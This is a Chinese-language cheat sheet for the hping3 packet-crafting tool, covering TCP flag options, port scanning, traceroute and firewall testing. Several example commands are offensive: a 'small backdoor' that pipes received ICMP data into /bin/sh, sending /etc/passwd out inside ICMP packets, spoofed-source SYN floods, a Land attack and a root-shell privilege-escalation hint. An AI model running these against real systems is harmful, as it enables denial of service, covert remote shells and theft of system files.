# hping3, 强大的发包工具

hping3可以发送自定义TCP/IP数据包，然后像ping一样展示响应。你可以使用hping3实现下面的一些工作：

+ 测试防火墙规则
+ 高级端口扫描
+ 通过协议类型、包大小、服务类型(TOS, type of service)和IP分片来测试网络性能
+ 探测MTU路径
+ 路由跟踪
+ 远程操作系统探测
+ TCP/IP栈审计

默认情况下，hping3发送TCP headers到目标主机的0端口，winsize设置为64，没有启用任何tcp flag。通常情况下，这是最好的隐藏ping(hide ping)实现方式，一个没有标志(null-flag)的tcp发送到0端口，有很大的可能不会被记录(logged)。

扫描模式：
```
-0, --rawip,    RAW IP mode, 此模式下hping会发送带数据的IP头
-1, --icmp,     ICMP mode, 发送ICMP echo-request，
                    可以使用--icmptype和--icmpcode选项配置icmp的type/code
-2, --udp,      UDP mode, 发送udp报文到主机的0端口
-8, --scan,     Scan mode, 端口扫描，需要接一个指定端口的参数
                    1,2,3   1-1000   all (代表0-65535)   1-1000,8888
                    known (/etc/services定义的端口)   !known
-9, --listen signature,    listen mode, 接收指定的数据
```

## TCP Scans

### TCP flags

```
-S, --syn    flags=SYN
-A, --ack    flags=ACK
-R, --rst    flags=RST
-F, --fin    flags=FIN
-P, --push   flags=PUSH
-U, --urg    flags=URG
-X, --xmas   flags=Xmas
-Y, --ymas   flags=Tmas
```

### 示例

```
# -c, 发送包数量
# -S, SYN tcp flag
hping3 -S 8.8.8.8 -p 80 -c 1

# 从80端口开始自增
hping3 -S 4.2.2.1 -p ++80 | grep SA

# 扫描多个端口
hping3 -8 50-56 -S 4.2.2.1

# ACK
hping3 -A 8.8.8.8 -p 80 -c 1

hping3 -F -P -U 8.8.8.8 -p 80 -c 1
```

## hping3使用示例

```
# udp
hping3 -2 192.168.1.1 -p 80 -c 1

# icmp
# -C 13相当于--icmp-ts, timestamp request
# -C 17相当于--icmp-addr, address mask request
hping3 -1 192.168.1.1 -C 13

# ping失效后的主机检测
# -i, --interval, 发送每个包之前等待的时间, 默认为1秒
# -i u10000, 等待10000微秒(micro seconds)
hping3 -c 4 -n -i 2 192.168.1.1

# -Q, --seqnum
hping3 192.168.1.103 -Q -p 139 -S

# 拦截流量
hping3 -9 HTTP -I eth0
hping3 -9 "http://www.google.com/search?" --beep -I eth0

# 文件传输
## 接收端
hping3 -1 192.168.1.100 -9 signature -I eth0
## 发送端, -d, --data, 设置发送包的大小; -E, --file, 使用文件内容填充包数据
hping3 -1 192.168.1.101 -e signature -E /etc/passwd -d 2000

# -T, --traceroute, 数据包跟踪
# -V, --verbose
hping3 -T -V -1 www.baidu.com
# --tr-keep-ttl, 不更改ttl
hping3 -S 64.233.167.99 -p 80 -T --ttl 15 --tr-keep-ttl -n

# firewall/ids testing
hping3 -S 72.14.207.99 -p 80 --tcp-timestamp

# 以Land Attack方式测试目标防火墙
# Land Attack时将发送源地址设置为与目标地址相同，诱使目标机与自己不停地建立连接
hping3 -S -c 1000000 -a 10.10.10.10 -p 21 10.10.10.10

# 小后门
hping3 -I eth0 -9 secret | /bin/sh
hping3 -R 192.168.1.100 -e secret -E commands_file -d 100 -c 1

# --flood, 以泛洪的方式攻击
# -a 伪造来源ip
hping3 -S 192.168.1.1 -a 192.168.1.254 -p 22 --flood
hping3 -S 192.168.1.101 -a 192.168.1.101 -k -s 135 -p 135 --flood
hping3 -A -S -P -U 66.66.66.66 -k -s 80 -p 80 -a 192.168.1.1

# fuzzing
hping3 -2 4.2.2.1 -p ++44444 -T -n
hping3 -S 4.2.2.1 -p 53 -T

# Local Privilege Escalation
hping3> id uid=0(root) gid=0(root) groups=0(root)

# 主机扫描
for addr in $(seq 1 254); do hping3 192.168.1.$addr -c 1 --icmp & done
```
